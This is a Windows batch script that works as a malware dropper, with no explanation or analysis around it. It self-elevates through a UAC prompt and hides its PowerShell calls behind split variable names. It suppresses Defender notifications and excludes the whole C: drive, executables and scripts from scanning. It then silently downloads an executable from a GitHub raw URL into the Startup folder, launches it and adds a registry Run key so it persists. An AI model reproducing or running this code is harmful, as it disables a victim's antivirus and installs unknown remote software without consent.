@echo off
@echo off
@echo off
@cls
﻿@echo off
@echo off
@cls
set "params=%*"
cd /d "%~dp0"
if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs"
fsutil dirty query %systemdrive% 1>nul 2>nul || (
  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
  "%temp%\getadmin.vbs"
  exit /B
)
﻿@echo off
@echo off
@echo off

set "snamsmdkdke=power"
set "gwsnzkdofkr=shell"
set "wbansmdpee=Add-MpPreference"
set "nqsodpwwnke=hidden"
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v "DisableEnhancedNotifications" /t REG_DWORD /d 1 /f >nul 2>nul

﻿@echo off
@echo off
%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionPath 'C:\\'"

@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.exe'"

@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.bat'"

@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionExtension '.ps1'"


@echo off

@echo off

@echo off


%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -Command "%wbansmdpee% -ExclusionProcess 'Microsys.exe'"

@echo on

@echo off

%snamsmdkdke%%gwsnzkdofkr% -w %nqsodpwwnke% -c %wbansmdpee% -ExclusionPath "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
timeout /t 5 /nobreak >nul 

@echo off

set "URL=https://raw.github.com/flexhere22-ct/x/refs/heads/main/Microsys.exe"

@echo off

set "DEST=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsys.exe"
﻿@echo off
@echo off
﻿@echo off
@echo off
if exist "%DEST%" del "%DEST%"
%snamsmdkdke%%gwsnzkdofkr% -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%DEST%'"
if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

@echo off

start /min "" "%DEST%"
﻿@echo off
@echo off
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SysWOW64" /d "\"C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsys.exe\"" /f
exit